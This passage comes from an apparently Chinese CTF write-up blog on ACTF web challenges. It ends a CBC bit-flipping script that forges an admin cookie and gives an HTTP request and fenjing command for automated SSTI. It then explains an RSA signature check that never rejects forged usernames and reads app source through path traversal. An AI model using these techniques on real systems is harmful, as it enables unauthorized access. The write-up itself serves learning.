或上一块密文）进行字节修改，</span></span><br><span class="line"><span class="string">    修改公式：new_byte = old_byte XOR (orig_byte XOR target_byte)</span></span><br><span class="line"><span class="string">    orig 和 target 必须长度相同。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(orig) != <span class="built_in">len</span>(target):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;原始用户名和目标用户名长度必须一致！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cookie_b = IV || C1 || C2 || ...  按 16 字节为一块</span></span><br><span class="line">    <span class="comment"># 计算需要修改的块索引以及在块内的位置</span></span><br><span class="line">    block_index = offset // BLOCK_SIZE</span><br><span class="line">    byte_index = offset % BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果 block_index==0 ，则修改 IV；否则修改前一个密文块</span></span><br><span class="line">    <span class="keyword">if</span> block_index == <span class="number">0</span>:</span><br><span class="line">        mod_block_start = <span class="number">0</span>  <span class="comment"># IV 就在前 16 字节</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mod_block_start = block_index * BLOCK_SIZE - BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">    mod_block = <span class="built_in">bytearray</span>(</span><br><span class="line">        cookie_b[mod_block_start: mod_block_start + BLOCK_SIZE])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对需要修改的部分依次进行位翻转</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(orig)):</span><br><span class="line">        pos_in_block = byte_index + i</span><br><span class="line">        <span class="keyword">if</span> pos_in_block &gt;= BLOCK_SIZE:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;用户名跨越块边界，本脚本目前只支持单个块内部修改！&quot;</span>)</span><br><span class="line">        <span class="comment"># 原先密文中前一块的对应字节 old_byte</span></span><br><span class="line">        old_byte = mod_block[pos_in_block]</span><br><span class="line">        <span class="comment"># 计算差异</span></span><br><span class="line">        diff = orig[i] ^ target[i]</span><br><span class="line">        mod_block[pos_in_block] = old_byte ^ diff</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将修改后的块写回到 cookie_b 中</span></span><br><span class="line">    cookie_b = <span class="built_in">bytearray</span>(cookie_b)</span><br><span class="line">    cookie_b[mod_block_start: mod_block_start + BLOCK_SIZE] = mod_block</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(cookie_b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_username_offset</span>(<span class="params">plaintext: <span class="built_in">str</span>, username: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算 username 在 plaintext 中的偏移量。</span></span><br><span class="line"><span class="string">    plaintext 通常是生成 cookie 时的 JSON 字符串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pos = plaintext.find(username)</span><br><span class="line">    <span class="keyword">if</span> pos == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;未在预估的明文中找到用户名字符串!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> pos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simulate_plaintext</span>(<span class="params">orig_username: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    构造一个与服务端 JSON 序列化结果格式类似的字符串，</span></span><br><span class="line"><span class="string">    仅用于推断用户名所在偏移位置。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 注意：实际的 register_time 和 password_raw 无关紧要，此处只需保证结构格式与实际一致</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: orig_username,</span><br><span class="line">        <span class="string">&quot;password_raw&quot;</span>: <span class="string">&quot;dummy&quot;</span>,</span><br><span class="line">        <span class="string">&quot;register_time&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;用法: &#123;&#125; &lt;cookie_base64&gt; &lt;orig_username&gt; &lt;target_username&gt;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            sys.argv[<span class="number">0</span>]))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;例如: &#123;&#125; &lt;cookie_str&gt; aaaaa admin&quot;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    cookie_base64 = sys.argv[<span class="number">1</span>]</span><br><span class="line">    orig_username = sys.argv[<span class="number">2</span>].encode()</span><br><span class="line">    target_username = sys.argv[<span class="number">3</span>].encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(orig_username) != <span class="built_in">len</span>(target_username):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;原始用户名和目标用户名长度必须一致！&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解码原始 cookie</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_bytes = base64.b64decode(cookie_base64)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cookie解码失败: &quot;</span>, e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 模拟生成明文，帮助定位用户名位置</span></span><br><span class="line">    plaintext_sim = simulate_plaintext(orig_username.decode())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        offset = find_username_offset(plaintext_sim, orig_username.decode())</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;推测用户名在明文中的偏移量：&quot;</span>, offset)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 修改 cookie 中对应的前一块数据</span></span><br><span class="line">    cookie_modified = flip_bytes(</span><br><span class="line">        cookie_bytes, offset, orig_username, target_username)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出新的 cookie</span></span><br><span class="line">    new_cookie_base64 = base64.b64encode(cookie_modified).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;新构造的 cookie：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(new_cookie_base64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>我们要先拿到<code>aaaaa</code>的<code>cookie</code>，貌似这里用户<strong>已经存在</strong>了，我直接用一手<code>123456</code>的弱口令就登进去了<br><img src="https://picx.zhimg.com/80/v2-7f037ed155981a1710249bc6025d9d52_1440w.png" alt=""><br>接下来就是<code>SSTI</code>，<strong>fenjing</strong>直接梭</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">GET /home?payload=PAYLOAD HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">63789</span></span><br><span class="line">Referer: http://<span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">63789</span>/login</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">135.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Cookie: jwbcookie=2nRR2vOrnDt+vcwOrbWN3f8SGG1kNMmek6VPEE7iZeu9EI9LY9V+cjXoKdh6r4IvaPCzi3AGKY+tlfr1HdEgjxsy5IANc9hX3VCnN66pvQiCM2xu1aHzHAVzHSYAr2qX</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>python3 -m fenjing crack-request -f http.txt —host “61.147.171.105” —port 63789</strong></p><p><strong>ACTF{n3vEr_imPlem3nT_SuCh_Iv_HIJacK4bl3_C00Kie}</strong></p><p>我这里使用的是<code>wsl2</code>的环境，因为之前试过我的<code>win</code>跑不了。。。</p><h2 id="not-so-web-2"><a href="#not-so-web-2" class="headerlink" title="not so web 2"></a>not so web 2</h2><blockquote><p>这次用了非对称应该安全了吧</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, json, time</span><br><span class="line"><span class="keyword">import</span> os, sys, binascii</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass, asdict</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY, ADMIN_PASSWORD</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    render_template_string,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    flash,</span><br><span class="line">    session,</span><br><span class="line">    abort,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = KEY</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&quot;/etc/ssl/nginx/local.key&quot;</span>):</span><br><span class="line">    private_key = RSA.importKey(<span class="built_in">open</span>(<span class="string">&quot;/etc/ssl/nginx/local.key&quot;</span>, <span class="string">&quot;r&quot;</span>).read())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    private_key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">public_key = private_key.publickey()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">APPUser</span>:</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    password_raw: <span class="built_in">str</span></span><br><span class="line">    register_time: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  In-memory store for user registration</span></span><br><span class="line">users: <span class="type">Dict</span>[<span class="built_in">str</span>, APPUser] = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: APPUser(name=<span class="string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_cookie</span>(<span class="params">cookie_b64: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    valid, _ = parse_cookie(cookie_b64)</span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">cookie_b64: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bool</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie_b64:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie = base64.b64decode(cookie_b64, validate=<span class="literal">True</span>).decode()</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        msg_str, sig_hex = cookie.split(<span class="string">&quot;&amp;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    msg_dict = json.loads(msg_str)</span><br><span class="line">    msg_str_bytes = msg_str.encode()</span><br><span class="line">    msg_hash = SHA256.new(msg_str_bytes)</span><br><span class="line">    sig = <span class="built_in">bytes</span>.fromhex(sig_hex)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        PKCS1_v1_5.new(public_key).verify(msg_hash, sig)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> valid, msg_dict.get(<span class="string">&quot;user_name&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cookie</span>(<span class="params">user: APPUser</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    msg_dict = &#123;<span class="string">&quot;user_name&quot;</span>: user.name, <span class="string">&quot;login_time&quot;</span>: <span class="built_in">int</span>(time.time())&#125;</span><br><span class="line">    msg_str = json.dumps(msg_dict)</span><br><span class="line">    msg_str_bytes = msg_str.encode()</span><br><span class="line">    msg_hash = SHA256.new(msg_str_bytes)</span><br><span class="line">    sig = PKCS1_v1_5.new(private_key).sign(msg_hash)</span><br><span class="line">    sig_hex = sig.<span class="built_in">hex</span>()</span><br><span class="line">    packed = msg_str + <span class="string">&quot;&amp;&quot;</span> + sig_hex</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(packed.encode()).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> validate_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        user_name = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> user_name <span class="keyword">in</span> users:</span><br><span class="line">            flash(<span class="string">&quot;Username already exists!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[user_name] = APPUser(</span><br><span class="line">                name=user_name, password_raw=password, register_time=<span class="built_in">int</span>(time.time())</span><br><span class="line">            )</span><br><span class="line">            flash(<span class="string">&quot;Registration successful! Please login.&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username].password_raw == password:</span><br><span class="line">            resp = redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/home&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    valid, current_username = parse_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid <span class="keyword">or</span> <span class="keyword">not</span> current_username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    user_profile = users.get(current_username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_profile:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        payload = request.args.get(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> payload:</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">if</span> char <span class="keyword">in</span> <span class="string">&quot;&#x27;_#&amp;;&quot;</span>:</span><br><span class="line">                    abort(<span class="number">403</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        html_template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            Your payload: %s</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (</span><br><span class="line">            current_username,</span><br><span class="line">            payload,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_template = (</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span></span><br><span class="line"><span class="string">        &#123;%% raw %%&#125;</span></span><br><span class="line"><span class="string">            %s</span></span><br><span class="line"><span class="string">        &#123;%% endraw %%&#125;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">            % base64.b64encode(<span class="built_in">open</span>(__file__, <span class="string">&quot;rb&quot;</span>).read()).decode()</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;jwbcookie&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>这回使用了<code>RSA</code>，本以为会十分的棘手，结果赛后看了师傅们的<code>wp</code>才知道，这题都直接送分了。。。</p><p>注意关键函数<code>parse_cookie()</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    PKCS1_v1_5.new(public_key).verify(msg_hash, sig)</span><br><span class="line">    valid = <span class="literal">True</span></span><br><span class="line"><span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> valid, msg_dict.get(<span class="string">&quot;user_name&quot;</span>)</span><br></pre></td></tr></table></figure><p>这题与1最大的不同就是使用了<strong>PKCS#1_v1.5签名算法</strong>，但是这里并不需要让<code>PKCS1_v1_5.new(public_key).verify(msg_hash, sig)</code>返回<strong>True</strong>，只需要让它<strong>不抛出错误</strong>即可，所以这题可以<strong>直接改用户名</strong>为<code>admin</code>，它只是会签名认证不通过，但<code>valid = True</code>，从而用户认证通过</p><p>代码审的不够认真啊</p><h2 id="ACTF-upload"><a href="#ACTF-upload" class="headerlink" title="ACTF upload"></a>ACTF upload</h2><p>图片的内容就是文件<code>base64</code>编码之后的输出</p><p>可以看到是<code>Python</code>的服务，直接尝试读取<code>/upload?file_path=../../../app/app.py</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for, flash, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.getenv(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;upload&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> hashlib.sha256(password.encode()).hexdigest() == <span class="string">&#x27;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0&#x27;</span>:</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flash(<span class="string">&#x27;Invalid password&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Login&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h2&gt;No need to register.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 